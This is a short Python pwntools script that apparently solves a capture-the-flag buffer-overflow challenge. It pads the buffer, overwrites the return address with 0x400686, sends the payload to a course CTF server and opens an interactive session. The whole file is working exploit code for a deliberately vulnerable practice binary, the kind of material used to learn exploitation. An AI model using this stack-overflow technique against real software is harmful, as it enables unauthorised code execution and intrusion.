#!/bin/python2
from pwn import *

payload = 'x'*(0x20 + 8) + p64(0x400686)
# p = process('./bof-74f8a85447bc51c4fd641dcdd05c66b3b09a2ecd')
p = connect('csie.ctf.tw', 10125)
p.send(payload)
p.interactive()
